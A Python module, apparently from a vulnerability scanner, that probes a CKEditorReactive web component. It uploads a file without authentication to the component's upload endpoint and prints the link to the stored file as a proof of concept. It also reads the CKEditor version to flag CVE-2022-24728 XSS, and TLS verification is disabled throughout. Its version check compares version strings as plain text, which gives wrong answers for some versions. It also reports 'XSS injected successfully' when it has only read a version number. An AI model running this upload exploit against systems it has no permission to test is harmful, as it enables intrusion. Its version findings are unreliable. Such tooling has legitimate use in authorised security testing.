from colorama import Fore, Style
import requests
import json
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def call_CKEditor_exploits(environment,app_module_name,header,component_name):
    print(f"| {Fore.WHITE}[|||] {Style.DIM}{Style.BRIGHT}[{component_name}] Checking unauthorized file upload in CKEditor component version...{Style.RESET_ALL}")
    exploit_api_file_storage(environment,component_name)

    print(f"| {Fore.WHITE}[|||] {Style.DIM}{Style.BRIGHT}[{component_name}] Checking XSS vulnerability in versions below 4.18...{Style.RESET_ALL}")
    exploit_CVE202224728(environment,header,component_name)


def exploit_api_file_storage(environment,component_name):
    url = environment+'/CKEditorReactive/rest/api/Upload'
    
    # Preparing the payload
    file = b'File stored improperly on target server'
    data = {
        "name": "upload"  # This name will be associated with the file on the server
    }
    files = {
        "file": ("payload.txt", file, "text/plain")  # (filename, content, content-type)
    }
    # Sending payload to target
    send = requests.post(url, data=data, files=files, verify=False)

    # Check response status
    if send.status_code == 200:
        # Convert the string to a dictionary
        response_dict = json.loads(send.content)
        # Check if "uploaded" is present and equal to 1
        if "uploaded" in response_dict and response_dict["uploaded"] == 1:
            print(f"| {Fore.WHITE}[|||] {Style.RESET_ALL}{Fore.GREEN}[{component_name}] Payload injected successfully!{Style.RESET_ALL}")
            print(f"| {Fore.WHITE}[POC] {Style.RESET_ALL}{Style.BRIGHT}[{component_name}] Payload link: {environment+response_dict['url']}{Style.RESET_ALL}")
        else:
            print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] Payload injected failed!{Style.RESET_ALL}")
            print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] Failed to upload the file or the upload attribute is not vulnerable.{Style.RESET_ALL}")
    else:
        print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] Payload injected failed!{Style.RESET_ALL}")
        print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] Failed to upload the file or the upload attribute is not vulnerable.{Style.RESET_ALL}")

def exploit_CVE202224728(environment,header,component_name):
    # Sending a GET request to the URL
    url = environment+'/CKEditorReactive/ckeditor/ckeditor.js'
    response = requests.get(url, headers=header, verify=False)

    # Checking the response code
    if response.status_code == 200:
        
        # Suponha que a codificação seja UTF-8 (ajuste se necessário)
        decoded_text = response.content.decode('utf-8')
        # Use regular expression para encontrar a versão
        match = re.search(r'version:"(.*?)"', decoded_text)

        if match:
            if match.group(1) <= '4.18.0':
                print(f"| {Fore.WHITE}[|||] {Style.RESET_ALL}{Fore.GREEN}[{component_name}] XSS injected successfully!{Style.RESET_ALL}")
                print(f"| {Fore.WHITE}[|||] {Style.RESET_ALL}{Style.BRIGHT}[{component_name}] The component version allows injecting code (XSS) via source according to CVE-2022-24728.{Style.RESET_ALL}")
                print(f"| {Fore.WHITE}[POC] {Style.RESET_ALL}{Style.BRIGHT}[{component_name}] See more details in https://securitylab.github.com/advisories/GHSL-2022-009_ckeditor4/{Style.RESET_ALL}")
            else:
                print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] XSS injected failed!{Style.RESET_ALL}")
                print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] This version of the component is not vulnerable to CVE-2022-24728.{Style.RESET_ALL}")
    else:
        print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] XSS injected failed!{Style.RESET_ALL}")
        print(f"| {Fore.WHITE}[|||] {Style.DIM}[{component_name}] This version of the component is not vulnerable to CVE-2022-24728.{Style.RESET_ALL}")
